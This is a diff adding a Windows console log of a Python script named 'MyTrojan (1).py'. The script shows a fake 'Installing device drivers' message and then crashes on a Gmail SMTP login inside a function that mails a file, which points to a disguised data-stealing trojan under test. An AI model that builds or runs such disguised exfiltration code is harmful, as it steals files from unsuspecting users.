@@ -1,0 +1,24 @@
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\mylo>"C:\Users\mylo\Downloads\MyTrojan (1).py"
+Installing device drivers please wait...
+Traceback (most recent call last):
+  File "C:\Users\mylo\Downloads\MyTrojan (1).py", line 39, in <module>
+    mailer(file)
+  File "C:\Users\mylo\Downloads\MyTrojan (1).py", line 28, in mailer
+    server.login("__mail" , "__password" )
+  File "C:\Users\mylo\AppData\Local\Programs\Python\Python36\lib\smtplib.py", li
+ne 730, in login
+    raise last_exception
+  File "C:\Users\mylo\AppData\Local\Programs\Python\Python36\lib\smtplib.py", li
+ne 721, in login
+    initial_response_ok=initial_response_ok)
+  File "C:\Users\mylo\AppData\Local\Programs\Python\Python36\lib\smtplib.py", li
+ne 642, in auth
+    raise SMTPAuthenticationError(code, resp)
+smtplib.SMTPAuthenticationError: (535, b'5.7.8 Username and Password not accepte
+d. Learn more at\n5.7.8  https://support.google.com/mail/?p=BadCredentials ik20-
+20020a170902ab1400b001b9da8b4eb7sm3981025plb.35 - gsmtp')
+
+C:\Users\mylo>
